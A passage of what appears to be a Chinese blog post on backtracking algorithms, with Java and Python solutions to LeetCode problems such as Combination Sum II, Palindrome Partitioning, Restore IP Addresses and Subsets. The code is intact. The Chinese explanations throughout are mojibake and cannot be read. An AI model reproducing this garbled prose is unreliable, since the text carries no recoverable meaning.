&#x3D;&#x3D; candidates[i - 1] å¹¶ä¸” used[i - 1] &#x3D;&#x3D; falseï¼Œå°±è¯´æ˜ï¼šå‰ä¸€ä¸ªæ ‘æï¼Œä½¿ç”¨äº†candidates[i - 1]ï¼Œä¹Ÿå°±æ˜¯è¯´åŒä¸€æ ‘å±‚ä½¿ç”¨è¿‡candidates[i - 1]ã€‚<br><img src="/2024/11/29/algorithm/backtracking/image-3.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    LinkedList&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; ans = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="type">boolean</span>[] used;</span><br><span class="line">    <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">combinationSum2</span><span class="params">(<span class="type">int</span>[] candidates, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        used = <span class="keyword">new</span> <span class="title class_">boolean</span>[candidates.length];</span><br><span class="line">        Arrays.fill(used, <span class="literal">false</span>);</span><br><span class="line">        Arrays.sort(candidates);</span><br><span class="line">        backtracking(candidates, target, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">backtracking</span><span class="params">(<span class="type">int</span>[] candidates, <span class="type">int</span> target, <span class="type">int</span> startIndex)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(sum == target)&#123;</span><br><span class="line">            ans.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>(path));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> startIndex; i &lt; candidates.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(sum + candidates[i] &gt; target)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(i &gt; <span class="number">0</span> &amp;&amp; candidates[i] == candidates[i - <span class="number">1</span>] &amp;&amp; !used[i-<span class="number">1</span>])&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            used[i] = <span class="literal">true</span>;</span><br><span class="line">            sum += candidates[i];</span><br><span class="line">            path.add(candidates[i]);</span><br><span class="line">            backtracking(candidates, target, i+<span class="number">1</span>);</span><br><span class="line">            used[i] = <span class="literal">false</span>;</span><br><span class="line">            sum -= candidates[i];</span><br><span class="line">            path.removeLast();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸‹é¢è¿™ä¸ªæ˜¯ä¸ä½¿ç”¨usedæ•°ç»„çš„ç‰ˆæœ¬</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    LinkedList&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">combinationSum2</span><span class="params">(<span class="type">int</span>[] candidates, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        Arrays.sort(candidates);</span><br><span class="line">        backtracking(candidates, target, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">backtracking</span><span class="params">(<span class="type">int</span>[] candidates, <span class="type">int</span> target, <span class="type">int</span> startIndex)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(sum == target)&#123;</span><br><span class="line">            res.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(path));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> startIndex; i &lt; candidates.length &amp;&amp; sum + candidates[i] &lt;= target; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i &gt; startIndex &amp;&amp; candidates[i] == candidates[i-<span class="number">1</span>])&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            sum += candidates[i];</span><br><span class="line">            path.add(candidates[i]);</span><br><span class="line">            backtracking(candidates, target, i+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> path.getLast();</span><br><span class="line">            sum -= temp;</span><br><span class="line">            path.removeLast();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="131-åˆ†å‰²å›æ–‡ä¸²"><a href="#131-åˆ†å‰²å›æ–‡ä¸²" class="headerlink" title="131. åˆ†å‰²å›æ–‡ä¸²"></a>131. åˆ†å‰²å›æ–‡ä¸²</h2><p>ç»™ä½ ä¸€ä¸ªå­—ç¬¦ä¸² sï¼Œè¯·ä½ å°† s åˆ†å‰²æˆä¸€äº›å­ä¸²ï¼Œä½¿æ¯ä¸ªå­ä¸²éƒ½æ˜¯ å›æ–‡ä¸² ã€‚è¿”å› s æ‰€æœ‰å¯èƒ½çš„åˆ†å‰²æ–¹æ¡ˆã€‚</p><p>ç¤ºä¾‹ 1ï¼š<br>è¾“å…¥ï¼šs &#x3D; â€œaabâ€<br>è¾“å‡ºï¼š[[â€œaâ€,â€aâ€,â€bâ€],[â€œaaâ€,â€bâ€]]</p><p>ç¤ºä¾‹ 2ï¼š<br>è¾“å…¥ï¼šs &#x3D; â€œaâ€<br>è¾“å‡ºï¼š[[â€œaâ€]]<br><img src="/2024/11/29/algorithm/backtracking/image-4.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## åŸºç¡€ç‰ˆçš„ä»£ç </span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">partition</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">str</span>]]:</span><br><span class="line">        result = []</span><br><span class="line">        <span class="variable language_">self</span>.backtracking(s, <span class="number">0</span>, [], result);</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">backtracking</span>(<span class="params">self, s, start_index, path, result</span>):</span><br><span class="line">        <span class="keyword">if</span> start_index == <span class="built_in">len</span>(s):</span><br><span class="line">            result.append(path[:])</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># å•å±‚é€’å½’é€»è¾‘</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start_index, <span class="built_in">len</span>(s)):</span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.is_palindrome(s, start_index, i):</span><br><span class="line">                path.append(s[start_index:i+<span class="number">1</span>])</span><br><span class="line">                <span class="variable language_">self</span>.backtracking(s, i+<span class="number">1</span>, path, result)</span><br><span class="line">                path.pop()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_palindrome</span>(<span class="params">self, s:<span class="built_in">str</span>, start:<span class="built_in">int</span>, end:<span class="built_in">int</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        i:<span class="built_in">int</span> = start</span><br><span class="line">        j:<span class="built_in">int</span> = end</span><br><span class="line">        <span class="keyword">while</span> i&lt;j:</span><br><span class="line">            <span class="keyword">if</span> s[i] != s[j]:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            j -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä»£ç è¿˜å­˜åœ¨ä¸€å®šçš„ä¼˜åŒ–ç©ºé—´, åœ¨äºå¦‚ä½•æ›´é«˜æ•ˆçš„è®¡ç®—ä¸€ä¸ªå­å­—ç¬¦ä¸²æ˜¯å¦æ˜¯å›æ–‡å­—ä¸²ã€‚ä¸Šè¿°ä»£ç isPalindromeå‡½æ•°è¿ç”¨åŒæŒ‡é’ˆçš„æ–¹æ³•æ¥åˆ¤å®šå¯¹äºä¸€ä¸ªå­—ç¬¦ä¸²s, ç»™å®šèµ·å§‹ä¸‹æ ‡å’Œç»ˆæ­¢ä¸‹æ ‡, æˆªå–å‡ºçš„å­å­—ç¬¦ä¸²æ˜¯å¦æ˜¯å›æ–‡å­—ä¸²ã€‚ä½†æ˜¯å…¶ä¸­æœ‰ä¸€å®šçš„é‡å¤è®¡ç®—å­˜åœ¨:<br>ä¾‹å¦‚ç»™å®šå­—ç¬¦ä¸²â€abcdeâ€, åœ¨å·²çŸ¥â€bcdâ€ä¸æ˜¯å›æ–‡å­—ä¸²æ—¶, ä¸å†éœ€è¦å»åŒæŒ‡é’ˆæ“ä½œâ€abcdeâ€è€Œå¯ä»¥ç›´æ¥åˆ¤å®šå®ƒä¸€å®šä¸æ˜¯å›æ–‡å­—ä¸²ã€‚<br>å…·ä½“æ¥è¯´, ç»™å®šä¸€ä¸ªå­—ç¬¦ä¸²s, é•¿åº¦ä¸ºn, å®ƒæˆä¸ºå›æ–‡å­—ä¸²çš„å……åˆ†å¿…è¦æ¡ä»¶æ˜¯s[0] &#x3D;&#x3D; s[n-1]ä¸”s[1:n-1]æ˜¯å›æ–‡å­—ä¸²ã€‚<br>å¤§å®¶å¦‚æœç†Ÿæ‚‰åŠ¨æ€è§„åˆ’è¿™ç§ç®—æ³•çš„è¯, æˆ‘ä»¬å¯ä»¥é«˜æ•ˆåœ°äº‹å…ˆä¸€æ¬¡æ€§è®¡ç®—å‡º, é’ˆå¯¹ä¸€ä¸ªå­—ç¬¦ä¸²s, å®ƒçš„ä»»ä½•å­ä¸²æ˜¯å¦æ˜¯å›æ–‡å­—ä¸², ç„¶ååœ¨æˆ‘ä»¬çš„å›æº¯å‡½æ•°ä¸­ç›´æ¥æŸ¥è¯¢å³å¯, çœå»äº†åŒæŒ‡é’ˆç§»åŠ¨åˆ¤å®šè¿™ä¸€æ­¥éª¤.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">partition</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">str</span>]]:</span><br><span class="line">        result = []</span><br><span class="line">        isPalindrome = [[<span class="literal">False</span>] * <span class="built_in">len</span>(s) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s))] <span class="comment"># åˆå§‹åŒ–isPalindromeçŸ©é˜µ</span></span><br><span class="line">        <span class="variable language_">self</span>.computePalindrome(s, isPalindrome)</span><br><span class="line">        <span class="variable language_">self</span>.backtracking(s, <span class="number">0</span>, [], result, isPalindrome)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">backtracking</span>(<span class="params">self, s, startIndex, path, result, isPalindrome</span>):</span><br><span class="line">        <span class="keyword">if</span> startIndex &gt;= <span class="built_in">len</span>(s):</span><br><span class="line">            result.append(path[:])</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(startIndex, <span class="built_in">len</span>(s)):</span><br><span class="line">            <span class="keyword">if</span> isPalindrome[startIndex][i]:</span><br><span class="line">                substring = s[startIndex:i+<span class="number">1</span>]</span><br><span class="line">                path.append(substring)</span><br><span class="line">                <span class="variable language_">self</span>.backtracking(s, i+<span class="number">1</span>, path, result, isPalindrome)</span><br><span class="line">                path.pop()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">computePalindrome</span>(<span class="params">self, s, isPalindrome</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s) - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>): <span class="comment"># # éœ€è¦å€’åºè®¡ç®—ï¼Œä¿è¯åœ¨iè¡Œæ—¶ï¼Œi+1è¡Œå·²ç»è®¡ç®—å¥½äº†</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i, <span class="built_in">len</span>(s)):</span><br><span class="line">                <span class="keyword">if</span> j == i:</span><br><span class="line">                    isPalindrome[i][j] = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">elif</span> j - i == <span class="number">1</span>:</span><br><span class="line">                    isPalindrome[i][j] = (s[i] == s[j])</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    isPalindrome[i][j] = (s[i] == s[j] <span class="keyword">and</span> isPalindrome[i+<span class="number">1</span>][j-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><h2 id="93-å¤åŸ-IP-åœ°å€"><a href="#93-å¤åŸ-IP-åœ°å€" class="headerlink" title="93. å¤åŸ IP åœ°å€"></a>93. å¤åŸ IP åœ°å€</h2><p>æœ‰æ•ˆ IP åœ°å€ æ­£å¥½ç”±å››ä¸ªæ•´æ•°ï¼ˆæ¯ä¸ªæ•´æ•°ä½äº 0 åˆ° 255 ä¹‹é—´ç»„æˆï¼Œä¸”ä¸èƒ½å«æœ‰å‰å¯¼ 0ï¼‰ï¼Œæ•´æ•°ä¹‹é—´ç”¨ â€˜.â€™ åˆ†éš”ã€‚</p><p>ä¾‹å¦‚ï¼šâ€0.1.2.201â€ å’Œ â€œ192.168.1.1â€ æ˜¯ æœ‰æ•ˆ IP åœ°å€ï¼Œä½†æ˜¯ â€œ0.011.255.245â€ã€â€192.168.1.312â€ å’Œ â€œ<a href="mailto:&#49;&#57;&#50;&#x2e;&#49;&#54;&#x38;&#x40;&#x31;&#46;&#49;">&#49;&#57;&#50;&#x2e;&#49;&#54;&#x38;&#x40;&#x31;&#46;&#49;</a>â€œ æ˜¯ æ— æ•ˆ IP åœ°å€ã€‚<br>ç»™å®šä¸€ä¸ªåªåŒ…å«æ•°å­—çš„å­—ç¬¦ä¸² s ï¼Œç”¨ä»¥è¡¨ç¤ºä¸€ä¸ª IP åœ°å€ï¼Œè¿”å›æ‰€æœ‰å¯èƒ½çš„æœ‰æ•ˆ IP åœ°å€ï¼Œè¿™äº›åœ°å€å¯ä»¥é€šè¿‡åœ¨ s ä¸­æ’å…¥ â€˜.â€™ æ¥å½¢æˆã€‚ä½  ä¸èƒ½ é‡æ–°æ’åºæˆ–åˆ é™¤ s ä¸­çš„ä»»ä½•æ•°å­—ã€‚ä½ å¯ä»¥æŒ‰ ä»»ä½• é¡ºåºè¿”å›ç­”æ¡ˆã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">restoreIpAddresses</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">str</span>]:</span><br><span class="line">        result = []</span><br><span class="line">        <span class="variable language_">self</span>.backtracking(s, <span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;&quot;</span>, result)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">backtracking</span>(<span class="params">self, s, start_index, point_num, current, result</span>):</span><br><span class="line">        <span class="keyword">if</span> point_num == <span class="number">3</span>: <span class="comment"># é€—ç‚¹æ•°é‡ä¸º3æ—¶ï¼Œåˆ†éš”ç»“æŸ</span></span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.is_valid(s, start_index, <span class="built_in">len</span>(s) - <span class="number">1</span>): <span class="comment"># åˆ¤æ–­ç¬¬å››æ®µå­å­—ç¬¦ä¸²æ˜¯å¦åˆæ³•</span></span><br><span class="line">                current += s[start_index:]</span><br><span class="line">                result.append(current)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start_index, <span class="built_in">len</span>(s)):</span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.is_valid(s, start_index, i):</span><br><span class="line">                sub = s[start_index:i+<span class="number">1</span>]</span><br><span class="line">                <span class="variable language_">self</span>.backtracking(s, i+<span class="number">1</span>, point_num+<span class="number">1</span>, current+sub+<span class="string">&#x27;.&#x27;</span>, result)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_valid</span>(<span class="params">self, s, start, end</span>):</span><br><span class="line">        <span class="keyword">if</span> start &gt; end:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> s[start] == <span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> start != end:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        num = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, end+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> s[i].isdigit():</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            num = num * <span class="number">10</span> + <span class="built_in">int</span>(s[i])</span><br><span class="line">            <span class="keyword">if</span> num &gt; <span class="number">255</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><h2 id="78-å­é›†"><a href="#78-å­é›†" class="headerlink" title="78. å­é›†"></a>78. å­é›†</h2><p>ç»™ä½ ä¸€ä¸ªæ•´æ•°æ•°ç»„ nums ï¼Œæ•°ç»„ä¸­çš„å…ƒç´  äº’ä¸ç›¸åŒ ã€‚è¿”å›è¯¥æ•°ç»„æ‰€æœ‰å¯èƒ½çš„å­é›†ï¼ˆå¹‚é›†ï¼‰ã€‚è§£é›† ä¸èƒ½ åŒ…å«é‡å¤çš„å­é›†ã€‚ä½ å¯ä»¥æŒ‰ ä»»æ„é¡ºåº è¿”å›è§£é›†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ç¤ºä¾‹ 1ï¼š</span><br><span class="line">è¾“å…¥ï¼šnums = [1,2,3]</span><br><span class="line">è¾“å‡ºï¼š[[],[1],[2],[1,2],[3],[1,3],[2,3],[1,2,3]]</span><br><span class="line"></span><br><span class="line">ç¤ºä¾‹ 2ï¼š</span><br><span class="line">è¾“å…¥ï¼šnums = [0]</span><br><span class="line">è¾“å‡ºï¼š[[],[0]]</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜ä¸»è¦å°±æ˜¯è¦éå†æ‰€æœ‰çš„è·¯å¾„ è€Œä¸éœ€è¦å‡æ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">subsets</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        result = []</span><br><span class="line">        path = []</span><br><span class="line">        <span class="variable language_">self</span>.backtracking(nums, <span class="number">0</span>, path, result)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">backtracking</span>(<span class="params">self, nums, startIndex, path, result</span>):</span><br><span class="line">        result.append(path[:])</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(startIndex, <span class="built_in">len</span>(nums)):</span><br><span class="line">            path.append(nums[i])</span><br><span class="line">            <span class="variable language_">self</span>.backtracking(nums, i+<span class="number">1</span>, path, result)</span><br><span class="line">            path.pop()</span><br></pre></td></tr></table></figure><h2 id="90-å­é›†II"><a href="#90-å­é›†II" class="headerlink" title="90.å­é›†II"></a>90.å­é›†II</h2><p>ç»™å®šä¸€ä¸ªå¯èƒ½åŒ…å«é‡å¤å…ƒç´ çš„æ•´æ•°æ•°ç»„ numsï¼Œè¿”å›è¯¥æ•°ç»„æ‰€æœ‰å¯èƒ½çš„å­é›†ï¼ˆå¹‚é›†ï¼‰ã€‚<br>è¯´æ˜ï¼šè§£é›†ä¸èƒ½åŒ…å«é‡å¤çš„å­é›†ã€‚</p><p>ç¤ºä¾‹:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥: [1,2,2]</span><br><span class="line">è¾“å‡º: [ [2], [1], [1,2,2], [2,2], [1,2], []]</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜ç›®å’Œ78.å­é›† (opens new window)åŒºåˆ«å°±æ˜¯é›†åˆé‡Œæœ‰é‡å¤å…ƒç´ äº†ï¼Œè€Œä¸”æ±‚å–çš„å­é›†è¦å»é‡ã€‚<br><img src="/2024/11/29/algorithm/backtracking/image-5.png"></p><h2 id="491-éé€’å‡å­åºåˆ—"><a href="#491-éé€’å‡å­åºåˆ—" class="headerlink" title="491. éé€’å‡å­åºåˆ—"></a>491. éé€’å‡å­åºåˆ—</h2><p>ç»™ä½ ä¸€ä¸ªæ•´æ•°æ•°ç»„ nums ï¼Œæ‰¾å‡ºå¹¶è¿”å›æ‰€æœ‰è¯¥æ•°ç»„ä¸­ä¸åŒçš„é€’å¢å­åºåˆ—ï¼Œé€’å¢å­åºåˆ—ä¸­ è‡³å°‘æœ‰ä¸¤ä¸ªå…ƒç´  ã€‚ä½ å¯ä»¥æŒ‰ ä»»æ„é¡ºåº è¿”å›ç­”æ¡ˆã€‚<br>æ•°ç»„ä¸­å¯èƒ½å«æœ‰é‡å¤å…ƒç´ ï¼Œå¦‚å‡ºç°ä¸¤ä¸ªæ•´æ•°ç›¸ç­‰ï¼Œä¹Ÿå¯ä»¥è§†ä½œé€’å¢åºåˆ—çš„ä¸€ç§ç‰¹æ®Šæƒ…å†µã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ç¤ºä¾‹ 1ï¼š</span><br><span class="line">è¾“å…¥ï¼šnums = [4,6,7,7]</span><br><span class="line">è¾“å‡ºï¼š[[4,6],[4,6,7],[4,6,7,7],[4,7],[4,7,7],[6,7],[6,7,7],[7,7]]</span><br><span class="line"></span><br><span class="line">ç¤ºä¾‹ 2ï¼š</span><br><span class="line">è¾“å…¥ï¼šnums = [4,4,3,2,1]</span><br><span class="line">è¾“å‡ºï¼š[[4,4]]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">findSubsequences</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        result = []</span><br><span class="line">        path = []</span><br><span class="line">        <span class="variable language_">self</span>.backtracking(nums, <span class="number">0</span>, path, result)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">backtracking</span>(<span class="params">self, nums, startIndex, path, result</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(path) &gt; <span class="number">1</span>:</span><br><span class="line">            result.append(path[:])</span><br><span class="line">            <span class="comment"># æ³¨æ„è¿™é‡Œä¸è¦return å› ä¸ºéœ€è¦å–å¶å­ä¸Šçš„èŠ‚ç‚¹</span></span><br><span class="line"></span><br><span class="line">        uset = <span class="built_in">set</span>()</span><br><span class="line">        <span 